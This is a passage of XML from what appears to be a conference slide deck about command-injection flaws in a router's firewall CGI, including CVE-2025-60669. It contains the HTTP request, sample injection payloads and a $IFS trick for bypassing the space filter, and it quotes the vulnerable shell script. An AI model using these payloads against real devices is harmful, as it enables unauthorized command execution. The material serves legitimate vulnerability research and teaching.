            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist Medium"/>
              <a:ea typeface="Urbanist Medium"/>
              <a:cs typeface="Urbanist Medium"/>
              <a:sym typeface="Urbanist Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Urbanist Medium"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist Medium"/>
                <a:ea typeface="Urbanist Medium"/>
                <a:cs typeface="Urbanist Medium"/>
                <a:sym typeface="Urbanist Medium"/>
              </a:rPr>
              <a:t>Which option is vulnerable?</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist Medium"/>
              <a:ea typeface="Urbanist Medium"/>
              <a:cs typeface="Urbanist Medium"/>
              <a:sym typeface="Urbanist Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Urbanist Medium"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist Medium"/>
                <a:ea typeface="Urbanist Medium"/>
                <a:cs typeface="Urbanist Medium"/>
                <a:sym typeface="Urbanist Medium"/>
              </a:rPr>
              <a:t>Any guesses?</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist Medium"/>
              <a:ea typeface="Urbanist Medium"/>
              <a:cs typeface="Urbanist Medium"/>
              <a:sym typeface="Urbanist Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="364" name="Google Shape;364;p45"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3804175" y="732750"/>
            <a:ext cx="5111575" cy="3372225"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="365" name="Google Shape;365;p45"/>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6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="234750"/>
            <a:ext cx="8226600" cy="4848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sz="3000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>What can we control, what can we inject into?</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="3000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="371" name="Google Shape;371;p46"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="343450" y="842250"/>
            <a:ext cx="8487900" cy="36390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Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>POST /cgi-bin/firewall.cgi HTTP/1.1</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Host: wavlogin.link</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--snip--</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Origin: http://wavlogin.link</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Referer: http://wavlogin.link/man_security.shtml?r=83085</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Accept-Encoding: gzip, deflate, br</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Cookie: session=297459354</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Connection: keep-alive</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rPr b="1" lang="en" sz="1500">
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>firewall</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1500">
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>=websSysFirewall&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>remoteManagementEnabled</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1500">
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>=1&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>pingFrmWANFilterEnabled</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1500">
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>=0&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>blockPortScanEnabled</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1500">
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>=0&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>blockSynFloodEnabled</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1500">
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>=1</a:t>
            </a:r>
            <a:endParaRPr sz="1500">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="372" name="Google Shape;372;p46"/>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7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="234750"/>
            <a:ext cx="8490000" cy="4980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sz="3100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>CVE-2025-60669: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="3100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>All of them?</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="3100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="378" name="Google Shape;378;p47"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="245325" y="776850"/>
            <a:ext cx="8577900" cy="37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endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="379" name="Google Shape;379;p47"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="862925"/>
            <a:ext cx="8577901" cy="3315675"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="380" name="Google Shape;380;p47"/>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48"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="152400" y="152400"/>
            <a:ext cx="6157651" cy="3676209"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="386" name="Google Shape;386;p48"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6604425" y="917950"/>
            <a:ext cx="2218825" cy="3307575"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="387" name="Google Shape;387;p48"/>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9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="212250" y="210225"/>
            <a:ext cx="83739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a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Some differences to note</a:t>
            </a:r>
            <a:endParaRPr b="1">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="393" name="Google Shape;393;p49"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="278025" y="825900"/>
            <a:ext cx="8430900" cy="35736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No spaces allowed here, injection fails</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>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Not a problem for a simple injection </a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>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Issue when we want a more complex injection</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>`/bin/ls&gt;/tmp/1.out`</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>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Second issue when we have to remove our diag.txt file from /cgi-bin/</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Urbanist"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Solution? </a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="394" name="Google Shape;394;p49"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="489375" y="3862200"/>
            <a:ext cx="3009300" cy="5373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rPr>
              <a:t>`X=$IFS;rm${IFS}diag.txt`</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1500">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="395" name="Google Shape;395;p49"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="489375" y="1702025"/>
            <a:ext cx="3009300" cy="4650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rPr>
              <a:t>`/bin/ls&gt;/tmp/1.out`</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1500">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="396" name="Google Shape;396;p49"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="489375" y="2571750"/>
            <a:ext cx="3009300" cy="4650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rPr>
              <a:t>`/bin/ls -la &gt; /tmp/1.out`</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1500">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="397" name="Google Shape;397;p49"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4501040" y="3562475"/>
            <a:ext cx="3991504" cy="779800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="398" name="Google Shape;398;p49"/>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0"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="234750"/>
            <a:ext cx="84231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a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Automate, automate, automate</a:t>
            </a:r>
            <a:endParaRPr b="1">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="404" name="Google Shape;404;p50" title="firewall_injection.mkv">
            <a:hlinkClick r:id="rId3"/>
          </p:cNvPr>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="193275" y="670950"/>
            <a:ext cx="8744476" cy="3939575"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="405" name="Google Shape;405;p50"/>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1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="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1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="234750"/>
            <a:ext cx="85539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a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Why does this injection work?</a:t>
            </a:r>
            <a:endParaRPr b="1">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="411" name="Google Shape;411;p51"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="343450" y="842250"/>
            <a:ext cx="8487900" cy="37665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Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>cat /usr/sbin/winstar_firewall.sh </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#/bin/sh</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if [ "$1" == "-h" -o "$1" == "" ]</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then</a:t>
            </a:r>
            <a:endParaRPr sz="1500">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>    echo "winstar_firewall.sh [wan web function] [ ping via wan function ] [ block nmap ] [ block ddos ]"</a:t>
            </a:r>
            <a:endParaRPr b="1"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    exit 0</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fi</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rPr b="1" lang="en" sz="1500">
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>wan_manage_en="$1"</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>ping_via_wan_en="$2"</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>block_nmap_en="$3"</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>block_ddos_en="$4"</a:t>
            </a:r>
            <a:endParaRPr b="1"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lan_ip=`uci get network.lan.ipaddr | awk '{printf$1}'`</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--snip--</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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="412" name="Google Shape;412;p51"/>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2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="234750"/>
            <a:ext cx="85887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solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist Medium"/>
                <a:ea typeface="Urbanist Medium"/>
                <a:cs typeface="Urbanist Medium"/>
                <a:sym typeface="Urbanist Medium"/>
              </a:rPr>
              <a:t>WIFI Password Disclosure (WAN/LAN)</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist Medium"/>
              <a:ea typeface="Urbanist Medium"/>
              <a:cs typeface="Urbanist Medium"/>
